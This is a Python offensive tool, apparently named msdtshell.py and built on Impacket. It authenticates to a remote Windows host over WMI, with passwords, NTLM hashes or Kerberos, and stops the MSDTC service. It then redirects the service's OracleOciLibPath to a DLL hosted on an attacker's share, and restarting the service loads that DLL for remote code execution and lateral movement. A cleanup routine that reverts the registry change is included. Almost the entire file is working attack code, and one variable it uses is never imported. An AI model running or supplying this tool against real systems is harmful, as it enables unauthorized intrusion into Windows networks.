#!/usr/bin/env python
from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
import logging
import re

#from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(prog='msdtshell.py', add_help = True, description = "Tool to interact with the MSDTC service remotely over WMI using the dedicated WMI provider")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-dtcname', action='store', default='Local', help='name of the DTC instance (default: Local)')

    #parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    #parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
                        'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')

    method_group = parser.add_mutually_exclusive_group(required=True)

    method_group.add_argument('-filepath', action='store', help='location of hosted payload (e.g., "\\\\bad_server\\bad_share" for "Z:\\file_server\\file_share" )')
    method_group.add_argument('-reboot', action='store_true', help='utility command to attempt a reboot of the MSDTC service remotely.')
    method_group.add_argument('-cleanup', action='store_true', help='perform a cleanup by reverting changes made to registry. only performs this action if flag is set')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-rpc-auth-level', choices=['integrity', 'privacy','default'], nargs='?', default='default',
                       help='default, integrity (RPC_C_AUTHN_LEVEL_PKT_INTEGRITY) or privacy '
                            '(RPC_C_AUTHN_LEVEL_PKT_PRIVACY). For example CIM path "root/MSCluster" would require '
                            'privacy level by default)')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
 
    options = parser.parse_args()
    # Init the example's logger theme
    # - this is removed for now, as the Impacket library will log type errors ("[-] byte indices must be integers or slices, not str") when executing the methods
    # for the MSDTC objects, even though they are successful. as this is sort of a handjam/patched up utility tool, a fix probably involves either some re-writing
    # of the logging for the library, or something - all of which feels much harder than just disabling the logger. it's being left here in the event that 
    # i (or more likely, someone else) ends up having a better solution
    #logger.init(options.ts, options.debug)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        dcom = DCOMConnection(address, username, password, domain, lmhash, nthash, options.aesKey, oxidResolver=True,
                              doKerberos=options.k, kdcHost=options.dc_ip)

        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/msdtc', NULL, NULL)
        if options.rpc_auth_level == 'privacy':
            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        elif options.rpc_auth_level == 'integrity':
            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)

        iWbemLevel1Login.RemRelease()

        # if just doing a cleanup, only do that
        if options.cleanup:
            print('[+] attempting to revert the changes to MSDTC back to the original state...')
            try:

                # WMI call doesn't seem to have the ability to swap back to an expanded string (REG_EXPAND_SZ), so
                # the full path has to be added back in to enable 'functionality'. It's a 'pick your poison' deal; 
                # either the key matches the rest of the values (%systemroot%\system32) and the type is off,
                # or the type is proper, but the key looks different. Either way, an IOC remains

                msft_dtcadvhosttask, _ = iWbemServices.GetObject('MSFT_DtcAdvancedHostSettingTask')
                msft_dtcadvhosttask.Set('OracleOciLibPath','MTxOCI',r'C:\Windows\system32','String')

                print("[+] successfully reverted the path back for OracleOciLibPath")

            except Exception as e:
                print("[-] unable to revert the change - aborting")
                logging.error(str(e))
            
            try:
                msft_dtcadvhosttask.RemRelease()
                iWbemServices.RemRelease()
                dcom.disconnect()
            except:
                pass

            print('[+] done - hopefully it worked out')
            sys.exit()


        print("[+] checking the current values for MSDTC")
        msft_dtctask, _ = iWbemServices.GetObject('MSFT_DtcTask')
        # this is all very janky, but didn't have a better means to go about this (i.e., couldn't figure out a good way):
        #    search for the current output from DtcTask to both get the DtcName and check on the current status
        #    if it's stopped, continue. if not, it needs to be stopped first
        dtc_task_instance = msft_dtctask.Get(options.dtcname)
        all_output_bytes = bytes.fromhex(str(dtc_task_instance.getObject()))

        # DtcInstance\x00\x00Local\x00\x00HOSTNAME\x00\x00Stopped
        real_bad_parsing = re.search(br"DtcInstance\x00\x00\w+\x00\x00\w+\x00\x00\w+", all_output_bytes)

        if real_bad_parsing:
            print("[+] current values found:")
            dtc_values = re.split(b'\x00\x00', real_bad_parsing.group())
            print(f"\tTarget MSDTC DtcName: {dtc_values[1].decode()}")
            print(f"\tTarget MSDTC Status: {dtc_values[-1].decode()}")
            if dtc_values[-1].decode() != 'Stopped':
                print("[+] MSDTC service is currently running - attempting to stop the service")

                try:
                    msft_dtctask.Stop(options.dtcname,0) #DtcName, Recursive
                    print("[+] successfully stopped the MSDTC service")
                except Exception as e:
                    print("[-] unable to stop the current MSDTC service - aborting")
                    logging.error(str(e))
                    try:
                        msft_dtctask.RemRelease()
                        iWbemServices.RemRelease()
                        dcom.disconnect()
                    except:
                        pass
 
                # can just stick this rebooter here, because im not a dev
                if options.reboot:
                    print("[+] attempting to restart the service - standby")

                    try:
                        msft_dtctask.Start(options.dtcname) #DtcName, Recursive
                        print("[+] successfully restarted the MSDTC service - done!")
                        sys.exit()
                    except Exception as e:
                        print("[-] unable to restart the service - aborting")
                        logging.error(str(e))
                        try:
                            msft_dtctask.RemRelease()
                            iWbemServices.RemRelease()
                            dcom.disconnect()
                        except:
                            pass
                        sys.exit(1)
            else:
                if options.reboot:
                    print("[+] attempting to restart the service - standby")
                    try:
                        msft_dtctask.Stop(options.dtcname, 0) #DtcName, Recursive
                        print("[+] successfully stopped the MSDTC service")
                        msft_dtctask.Start(options.dtcname) #DtcName
                        print("[+] successfully restarted the MSDTC service - done!")
                        try:
                            msft_dtctask.RemRelease()
                            iWbemServices.RemRelease()
                            dcom.disconnect()
                        except:
                            pass
                        sys.exit()

                    except Exception as e:
                        print("[-] unable to restart the service - aborting")
                        logging.error(str(e))
                        try:
                            msft_dtctask.RemRelease()
                            iWbemServices.RemRelease()
                            dcom.disconnect()
                        except:
                            pass
                        sys.exit(1)

        else:
            print("[-] unable to get current DtcTask - aborting")
            msft_dtctask.RemRelease()
            iWbemServices.RemRelease()
            dcom.disconnect()

        
        print('[+] attempting to change the library path for MSDTC')
        msft_dtcadvhosttask, _ = iWbemServices.GetObject('MSFT_DtcAdvancedHostSettingTask')
        
        # set the OracleOciLibPath to point to new location
        #  name, subkey, value, type (has to be 'String')
        try:
            msft_dtcadvhosttask.Set('OracleOciLibPath','MTxOCI',options.filepath,'String')
            print("[+] successfully changed the path for 'OracleOciLibPath'")
        except Exception as e:
            print("[-] unable to change the 'OracleOciLibPath' for MSDTC - aborting")
            logging.error(str(e))
            try:
                msft_dtctask.RemRelease()
                msft_dtcadvhosttask.RemRelease()
                iWbemServices.RemRelease()
                dcom.disconnect()
            except:
                pass

        
        # trigger the DLL load by starting the service
        print('[+] starting the target MSDTC service - this may hang and still be successful, depending on your payload')
        try:
            msft_dtctask.Start(options.dtcname) #DtcName
            print("[+] successfully started the MSDTC service")
        except Exception as e:
            print("[-] unable to start the current MSDTC service - aborting")
            logging.error(str(e))
            try:
                msft_dtctask.RemRelease()
                msft_dtcadvhosttask.RemRelease()
                iWbemServices.RemRelease()
                dcom.disconnect()
            except:
                pass

        print('[+] done - hopefully it worked out')

        msft_dtcadvhosttask.RemRelease()
        msft_dtctask.RemRelease()
        iWbemServices.RemRelease()
        dcom.disconnect()

    except Exception as e:
        logging.error(str(e))
        try:
            dcom.disconnect()
        except:
            pass
